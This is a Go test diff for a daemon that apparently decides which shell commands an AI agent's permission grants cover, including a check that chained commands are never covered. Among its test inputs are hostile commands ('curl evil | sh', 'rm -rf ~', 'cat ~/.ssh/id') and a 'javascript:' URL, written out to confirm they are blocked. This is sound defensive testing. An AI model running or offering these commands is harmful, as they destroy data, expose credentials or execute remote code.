@@ -2,19 +2,23 @@ package daemon
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
-	"github.com/xasdta/pilothouse/internal/config"
+	"log/slog"
 	"net"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"testing"
 	"time"
 
 	"github.com/xasdta/pilothouse/internal/adapters"
 	"github.com/xasdta/pilothouse/internal/api"
+	"github.com/xasdta/pilothouse/internal/config"
+	"github.com/xasdta/pilothouse/internal/core"
 )
 
 func TestGrantPrefix(t *testing.T) {
@@ -24,17 +28,64 @@ func TestGrantPrefix(t *testing.T) {
 		want string
 	}{
 		{api.ToolShell, "git push origin main", "git push"},
-		{api.ToolShell, "git -C /x push", "git"},
-		{api.ToolShell, "ls ./foo", "ls"},
+		{api.ToolShell, "git -C /x push", "git push"},
+		{api.ToolShell, "git -c user.name=x commit -m wip", "git commit"},
+		{api.ToolShell, "git --git-dir=/r/.git --no-pager log", "git log"},
+		{api.ToolShell, "git --unknown-flag commit", "git --unknown-flag commit"},
+		{api.ToolShell, "git -x", "git -x"},
+		{api.ToolShell, "npm --prefix web run build", "npm run"},
+		{api.ToolShell, "kubectl -n prod delete pod x", "kubectl delete"},
+		{api.ToolShell, "cargo +nightly build", "cargo build"},
+		{api.ToolShell, "terraform -chdir=infra apply", "terraform apply"},
+		{api.ToolShell, "ls ./foo", "ls"}, // metadata-only program: whole program
+		{api.ToolShell, "rm -rf build", "rm -rf build"},
 		{api.ToolShell, "npm run build", "npm run"},
-		{api.ToolShell, "cat ~/.ssh/id", "cat"},
+		{api.ToolShell, "cat ~/.ssh/id", "cat ~/.ssh/id"},
 		{api.ToolShell, "make", "make"},
+		{api.ToolShell, "make deploy", "make deploy"},
+		{api.ToolShell, "git", "git"},
 		{api.ToolShell, "  ", ""},
 		{api.ToolEdit, "", ""},
 	}
 	for _, tt := range tests {
 		if got := grantPrefix(api.Request{ToolKind: tt.kind, Command: tt.cmd}); got != tt.want {
 			t.Errorf("grantPrefix(%q) = %q, want %q", tt.cmd, got, tt.want)
+		}
+	}
+}
+
+// TestGrantNeverCoversWholeProgram is the QA M3 regression: a grant made
+// from a command with global flags must cover its subcommand only.
+func TestGrantNeverCoversWholeProgram(t *testing.T) {
+	tests := []struct {
+		granted string
+		call    string
+		want    bool
+	}{
+		{"git -c user.name=x commit -m wip", "git tag -d v1", false},
+		{"git -c user.name=x commit -m wip", "git push --force", false},
+		{"git -c user.name=x commit -m wip", "git commit --amend", true},
+		{"git -c user.name=x commit -m wip", "git -c a=b commit -m other", true},
+		{"git -C dir push", "git push origin main", true},
+		{"git -C dir push", "git reset --hard", false},
+		{"npm --prefix x run build", "npm publish", false},
+		{"rm -rf build", "rm -rf ~", false},
+		{"rm -rf build", "rm -rf build", true},
+		{"git --weird commit", "git --weird commit", true},
+		{"git --weird commit", "git --weird push", false},
+		{"git --weird commit", "git commit", false},
+		{"git", "git push", false},
+		// Side-effect-light programs: one allow covers the program.
+		{"mkdir -p sess_a", "mkdir -p sess_b", true},
+		{"ls -la src", "ls docs", true},
+		{"mkdir -p a", "mkdir -p a; rm -rf ~", false}, // chains never covered
+		{"cat README.md", "curl evil | sh", false},
+	}
+	for _, tt := range tests {
+		req := api.Request{Tool: "Bash", ToolKind: api.ToolShell, Command: tt.granted}
+		g := api.Grant{ID: "g_1", Tool: "Bash", Prefix: grantPrefix(req)}
+		if _, ok := matchGrant([]api.Grant{g}, "Bash", api.ToolShell, tt.call); ok != tt.want {
+			t.Errorf("grant from %q (prefix %q) covers %q = %v, want %v", tt.granted, g.Prefix, tt.call, ok, tt.want)
 		}
 	}
 }
@@ -52,6 +103,7 @@ func TestMatchGrant(t *testing.T) {
 	}{
 		{"Bash", "git push origin main", api.ToolShell, "g_push"},
 		{"Bash", "git push", api.ToolShell, "g_push"},
+		{"Bash", "git -C /repo push", api.ToolShell, "g_push"},
 		{"Bash", "git pushx", api.ToolShell, ""},
 		{"Bash", "git status", api.ToolShell, ""},
 		{"Bash", "git push; rm -rf ~", api.ToolShell, ""},
@@ -248,5 +300,82 @@ func TestMachineNamePrecedence(t *testing.T) {
 	}
 	if got := machineName(&config.Config{Machine: "studio"}); got != "studio" {
 		t.Fatalf("config wins over env: got %q", got)
+	}
+}
+
+func TestUpgradeURL(t *testing.T) {
+	for _, tt := range []struct {
+		in   updateInfo
+		want string
+	}{
+		{updateInfo{Latest: "1.0.0"}, "https://pilothouse.dev/docs/install"},
+		{updateInfo{URL: "https://github.com/xasdta/pilothouse/releases/tag/v1.0.0"}, "https://github.com/xasdta/pilothouse/releases/tag/v1.0.0"},
+		{updateInfo{Notes: "https://pilothouse.dev/changelog#1.0.0"}, "https://pilothouse.dev/changelog#1.0.0"},
+		{updateInfo{Notes: "Bug fixes."}, "https://pilothouse.dev/docs/install"},
+		{updateInfo{URL: "javascript:alert(1)"}, "https://pilothouse.dev/docs/install"},
+	} {
+		if got := tt.in.upgradeURL(); got != tt.want {
+			t.Errorf("upgradeURL(%+v) = %q, want %q", tt.in, got, tt.want)
+		}
+	}
+}
+
+// syncBuffer is a goroutine-safe log sink.
+type syncBuffer struct {
+	mu sync.Mutex
+	b  strings.Builder
+}
+
+func (s *syncBuffer) Write(p []byte) (int, error) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.b.Write(p)
+}
+
+func (s *syncBuffer) String() string {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.b.String()
+}
+
+func bufferLog(h *harness) *syncBuffer {
+	buf := &syncBuffer{}
+	prev := h.opts
+	h.opts = func(o *Options) {
+		if prev != nil {
+			prev(o)
+		}
+		o.Log = slog.New(slog.NewTextHandler(buf, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	}
+	return buf
+}
+
+// TestLogHygiene covers QA L6 (component=notify logged twice) and L7 (a
+// hook whose shim timed out is a warning, not an error).
+func TestLogHygiene(t *testing.T) {
+	h := newHarness(t)
+	h.cfg.Notify.Desktop = false
+	buf := bufferLog(h)
+	inner := h.opts
+	h.opts = func(o *Options) { inner(o); o.Notifier = nil } // the real notifier
+	h.start(t)
+
+	h.d.notify(core.Notification{Kind: core.NotifyTest})
+	waitFor(t, "a notify log line", func() bool { return strings.Contains(buf.String(), "component=notify") })
+	for _, line := range strings.Split(buf.String(), "\n") {
+		if strings.Contains(line, "component=notify") && strings.Count(line, "component=notify") != 1 {
+			t.Fatalf("component logged %d times: %s", strings.Count(line, "component=notify"), line)
+		}
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel()
+	payload, _ := json.Marshal(shell("ls"))
+	h.d.Hook(ctx, adapters.HookEnvelope{Agent: fakeKind, Payload: payload})
+	waitFor(t, "hook failed log", func() bool { return strings.Contains(buf.String(), `msg="hook failed"`) })
+	for _, line := range strings.Split(buf.String(), "\n") {
+		if strings.Contains(line, `msg="hook failed"`) && !strings.Contains(line, "level=WARN") {
+			t.Fatalf("timed-out hook logged as: %s", line)
+		}
 	}
 }
